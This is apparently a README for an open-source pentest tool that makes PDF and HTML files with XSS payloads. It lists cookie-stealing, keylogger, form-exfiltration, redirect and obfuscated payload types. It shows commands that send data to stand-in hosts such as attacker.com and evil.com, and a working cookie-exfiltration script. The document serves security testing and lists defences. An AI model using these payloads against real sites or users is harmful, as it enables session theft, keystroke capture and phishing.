# XSS-PDF Generator

An advanced tool for generating PDF files containing various XSS (Cross-Site Scripting) payloads for security testing and penetration testing purposes.

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🚀 Features

- **10 Different XSS Payload Types**: Comprehensive collection of XSS attack vectors
- **URL Integration**: Support for data exfiltration to external URLs
- **Custom Payloads**: Ability to inject custom JavaScript code
- **Multiple Output Formats**: PDF and HTML file generation
- **Timestamped Files**: Automatic file naming with timestamps
- **Type-Specific Generation**: Generate specific payload types or all at once
- **Backward Compatibility**: Maintains compatibility with legacy usage

## 📋 Available XSS Payload Types

| Type | Description | Use Case |
|------|-------------|----------|
| `alert` | Basic alert payload | Simple XSS validation |
| `cookie` | Cookie stealing payload | Session hijacking simulation |
| `redirect` | Redirect/phishing payload | Phishing attack simulation |
| `form` | Form data exfiltration payload | Data theft simulation |
| `dom` | DOM manipulation payload | Page defacement testing |
| `obfuscated` | Obfuscated payload (Base64) | Bypass filter testing |
| `timer` | Time-based payload | Persistent XSS testing |
| `keylog` | Keylogger payload | Keystroke capture simulation |
| `network` | Network request payload | External communication testing |
| `file` | File system/storage access payload | Local storage access testing |

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No external dependencies required (uses only standard library)

### Installation
```bash
git clone https://github.com/SNGWN/XSS-PDF.git
cd XSS-PDF
```

## 📖 Usage

### Basic Commands

```bash
# Show help and available options
python3 script.py --help

# List all available XSS payload types
python3 script.py --list-types

# Generate basic PDF files (backward compatibility)
python3 script.py -o pdf

# Generate specific XSS payload type
python3 script.py -t alert

# Generate all XSS payload types
python3 script.py -t all

# Generate HTML XSS test file
python3 script.py -o html
```

### Advanced Usage

```bash
# Cookie stealer with data exfiltration URL
python3 script.py -t cookie -u http://attacker.com/collect

# Generate all payloads with URL for data exfiltration
python3 script.py -t all -u http://collaborator.burpsuite.com

# Custom JavaScript payload
python3 script.py -s "app.alert('Custom XSS'); document.location='http://evil.com'"

# Network request to specific endpoint
python3 script.py -t network -u https://httpbin.org/post

# Keylogger with data exfiltration
python3 script.py -t keylog -u http://logger.example.com/keys
```

## 🏁 Command Line Flags

| Flag | Long Form | Description | Example |
|------|-----------|-------------|---------|
| `-h` | `--help` | Show help message | `python3 script.py --help` |
| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
| | `--list-types` | List available payload types | `--list-types` |

## 📁 Output Files

### PDF Files
Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`

Examples:
- `xss_alert_20240115_143022.pdf`
- `xss_cookie_20240115_143025.pdf`
- `xss_custom_20240115_143030.pdf`

### HTML Files
Generated HTML files follow the naming convention: `xss_test_<timestamp>.html`

Example:
- `xss_test_20240115_143035.html`

## 🎯 Payload Examples

### Basic Alert
```javascript
app.alert('XSS Test - Basic Alert');
```

### Cookie Stealing
```javascript
var cookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://attacker.com/collect", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cookies=" + encodeURIComponent(cookies));
```

### DOM Manipulation
```javascript
document.body.style.backgroundColor = "red";
document.body.innerHTML = "<h1>XSS - DOM Hijacked!</h1>";
```

### Obfuscated Payload
```javascript
var obf = "YXBwLmFsZXJ0KCJPYmZ1c2NhdGVkIFhTUyBwYXlsb2FkIGV4ZWN1dGVkIik=";
eval(atob(obf));
```

## 🔍 Testing Methodology

1. **Generate Test Files**: Use the tool to create PDF files with various XSS payloads
2. **Upload/Embed**: Test file upload functionality on target applications
3. **Monitor Responses**: Check for JavaScript execution in PDF viewers
4. **Data Exfiltration**: Use URL flag to test data extraction capabilities
5. **Filter Bypass**: Test obfuscated payloads against security filters

## 🛡️ Defensive Measures

To protect against XSS-PDF attacks:

- Disable JavaScript in PDF viewers
- Implement strict file upload validation
- Use Content Security Policy (CSP) headers
- Sanitize and validate all user inputs
- Regular security testing and code reviews

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📈 Changelog

### Version 2.0 (Current)
- Added 10 different XSS payload types
- Implemented type-specific generation with `-t` flag
- Enhanced URL integration for data exfiltration
- Added comprehensive help and documentation
- Improved file naming with timestamps
- Added HTML output format
- Enhanced error handling and validation

### Version 1.0 (Legacy)
- Basic PDF generation with simple XSS payloads
- Limited to 2-3 payload types
- Basic URL and custom script support

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add comprehensive tests
4. Follow existing code style
5. Submit a pull request with detailed description

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.

## 🔗 Resources

- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PDF Security Research](https://blog.didierstevens.com/programs/pdf-tools/)
- [JavaScript Security Best Practices](https://developer.mozilla.org/en-US/docs/Web/Security)

---

**Remember**: This tool is for authorized security testing only. Always obtain proper permission before testing any systems.